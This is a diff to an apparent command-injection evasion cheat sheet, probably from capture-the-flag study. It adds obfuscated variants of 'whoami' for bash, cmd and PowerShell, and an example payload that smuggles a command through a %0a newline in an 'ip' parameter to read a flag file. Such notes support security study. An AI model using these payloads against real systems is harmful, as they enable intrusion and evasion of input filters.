@@ -40,13 +40,46 @@ echo %HOMEPATH:~6,-11%
 $env:HOMEPATH[0]
 ```
 
+# Commands
+
+```bash
+w'h'o'am'i
+w"h"o"am"i
+who$@ami
+w\ho\am\i
+```
+
+```bash
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+```
+
+```bash
+$(a="WhOaMi";printf %s "${a,,}")
+```
+
+```bash
+$(rev<<<'imaohw')
+```
+#### windows
+
+```cmd
+who^ami
+WhOaMi
+```
+
+```
+iex "$('imaohw'[-1..-20] -join '')"
+```
 # Example
 
-```
-ip=127.0.0.1%0a{ls,${PATH:0:1}home}
+```bash
+ip=127.0.0.1%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
 ```
 
+```bash
+cat /home/1nj3c70r/flag.txt
 ```
-ls /home
-```
+
+
+
 
